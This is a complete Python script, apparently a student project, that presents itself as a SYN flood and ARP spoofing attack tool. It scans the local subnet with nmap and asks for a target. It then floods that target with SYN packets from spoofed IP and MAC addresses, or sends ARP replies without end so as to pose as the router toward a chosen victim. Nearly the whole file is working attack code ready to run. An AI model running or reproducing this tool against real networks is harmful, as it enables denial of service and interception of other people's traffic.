from os import system
from sys import stdout
from scapy.all import *
from random import randint
from subprocess import call
import time
import random

def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip
def randomMAC():
	ls = ['1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f']
	mac = ""
	for i in range(6):
		st = ""
		st += random.choice(ls)
		st += random.choice(ls)
		mac += st +":"	
	return mac[:-1]

def randInt():
	x = randint(1000,9000)
	return x

def SYN_Flood(dstIP,dstPort,counter):
	total = 0
	print ("Packets are sending ...")
	ch = 'y'
	while(ch=='y' or ch == 'Y'):
		for x in range (0,counter):
			s_port = randInt()
			s_eq = randInt()
			w_indow = randInt()
			
			eth = Ether()
			eth.src = randomMAC()

			IP_Packet = IP ()
			IP_Packet.src = randomIP()
			IP_Packet.dst = dstIP

			TCP_Packet = TCP ()
			TCP_Packet.sport = s_port
			TCP_Packet.dport = dstPort
			TCP_Packet.flags = "S"
			TCP_Packet.seq = s_eq
			TCP_Packet.window = w_indow

			sendp(eth/IP_Packet/TCP_Packet, verbose=0)
			total+=1
		ch = str(input('Do you want to send next set of '+str(counter)+' packets?(Y/n) '))
	stdout.write("\nTotal packets sent: %i\n" % total)

def SYN_info():
	system("clear")
	print ("  SYN Flood Attack Tool  ")
	print ("-------------------------")
	print (" By")
	print ("   Maalolan K      18BLC1077")
	print ("   Somesh Kirthik  18BLC1047")
	print ("   Divya Kannan K  18BLC1046")

def get_vic_IP():
	dstIP = input ("\nTarget IP : ")
	dstPort = input ("Target Port : ")
	return dstIP,int(dstPort)

def ARP_info():
	system("clear")
	print ("  ARP Spoofing Attack Tool  ")
	print ("----------------------------")
	print (" By")
	print ("   Maalolan K      18BLC1077")
	print ("   Somesh Kirthik  18BLC1047")
	print ("   Divya Kannan K  18BLC1046")

def en_ip_fwd():
	import subprocess
	subprocess = subprocess.Popen("sudo sysctl -w net.ipv4.ip_forward=1", shell =True, stdout = subprocess.PIPE)
	subproc_return = subprocess.stdout.read()
	out_str = str(subproc_return,'utf-8')
	print(out_str)
	print("IP Forwarding enabled ")

def ip_subnet_find():
	import subprocess
	subprocess = subprocess.Popen("sudo ifconfig", shell =True, stdout = subprocess.PIPE)
	subproc_return = subprocess.stdout.read()
	out_str = str(subproc_return,'utf-8')
	pos_st = out_str.find('netmask ')
	pos_end = out_str.find('broadcast ')
	ip_st = out_str.find('inet')
	ip_addr = out_str[ip_st+5:pos_st].strip()
	subnet_mask = out_str[pos_st+8:pos_end].strip()
	ips = ip_addr.split('.')
	sub_ips = subnet_mask.split('.')
	return ips,sub_ips

def find_cidr(sub_ips):
	zeros = 0
	for k in sub_ips:
		if(k.strip() == '0'):
			zeros+=8
	cidr = 32 - zeros
	return cidr

def find_iproute(ips,cidr):
	k = cidr//8
	ip_route = ""
	for i in range(k):
		ip_route += ips[i] + '.'
	while i<3:
		ip_route+='0.'
		i+=1
	ip_route = ip_route[:len(ip_route)-1]
	return ip_route

def nmapExe(ip_route,cidr):
	nmap_cmd = "sudo nmap -sP " + ip_route + "/" + str(cidr)
	print(nmap_cmd)
	import subprocess
	subproc = subprocess.Popen(nmap_cmd, shell =True, stdout = subprocess.PIPE)
	subproc_return = subproc.stdout.read()
	nmap_out = str(subproc_return,'utf-8')
	print(nmap_out)
	return nmap_out

def find_routerIP(ip_route):
	return ip_route[:-1] + '1'

def do_arp(routerIP,nmap_out):
	op = 1 						   # Op code 1 for ARP requests
	victim = input('Enter the target IP to hack: ') # Person IP to attack
	victim = victim.replace(" ","")

	#spoof = raw_input('Enter the routers IP *SHOULD BE ON SAME ROUTER*: ') # routers IP.. Should be the same one.
	#spoof = spoof.replace(" ","")
	ippos = nmap_out.find(victim)
	macpos = nmap_out.find('MAC Address:',ippos)
	#print(nmap_out[macpos+13:macpos+30])
	mac = nmap_out[macpos+13:macpos+30]
	#mac = input('Enter the target MAC to hack: ') # MAC of the victim
	mac = mac.replace("-",":")
	mac = mac.replace(" ","")
	print("MAC Address of Target is ", end = "")
	print(mac)
	time.sleep(5)
	arp = ARP(op = op,psrc = routerIP,pdst = victim,hwdst = mac) 

	while 1:
		send(arp)

def main():
	#print(' Press 1 for SYN_Flood attack and 2 for ARP Spoofing ')
	n = int(input(' Press 1 for SYN_Flood attack and 2 for ARP Spoofing '))	
	if(n == 1):
		SYN_info()
		en_ip_fwd()
		ips,sub_ips = ip_subnet_find()
		cidr = find_cidr(sub_ips)
		ip_route = find_iproute(ips,cidr)
		nmap_out = nmapExe(ip_route,cidr)
		routerIP = find_routerIP(ip_route)
		print("\nFrom above choose any IP Address\n")
		dstIP,dstPort = get_vic_IP()
		counter = input ("How many packets do you want to send per epoch : ")
		SYN_Flood(dstIP,dstPort,int(counter))
	elif(n == 2):
		ARP_info()
		en_ip_fwd()
		ips,sub_ips = ip_subnet_find()
		cidr = find_cidr(sub_ips)
		ip_route = find_iproute(ips,cidr)
		nmap_out = nmapExe(ip_route,cidr)
		routerIP = find_routerIP(ip_route)
		print("\nFrom above choose any IP Address\n")		
		do_arp(routerIP,nmap_out)

main()